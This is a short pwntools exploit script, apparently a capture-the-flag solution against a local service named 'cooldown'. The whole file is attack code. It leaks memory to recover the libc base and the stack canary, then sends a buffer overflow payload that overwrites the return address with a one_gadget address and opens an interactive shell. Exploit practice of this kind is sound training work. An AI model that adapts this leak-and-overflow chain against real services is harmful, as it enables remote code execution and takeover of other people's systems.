from pwn import *

def leak(pattern):
    p.send(pattern)
    p.recvuntil(pattern)
    data = p.recvuntil("End")[:-3]
    p.sendline("N")
    return data

# p = process("./cooldown")
p = remote('localhost', 10105)

libc_base = u64(leak('a'*0x20)[:6]+'\0\0') - 0x5f1168
canary = u64('\0'+leak('a'*0x69)[:7])
one_gadget = libc_base + 0xf1207

print(hex(libc_base))

payload = '\0'*0x68+p64(canary)+p64(0)+p64(one_gadget)
p.send(payload)
p.sendlineafter("[Y/N]", "Y")
p.interactive()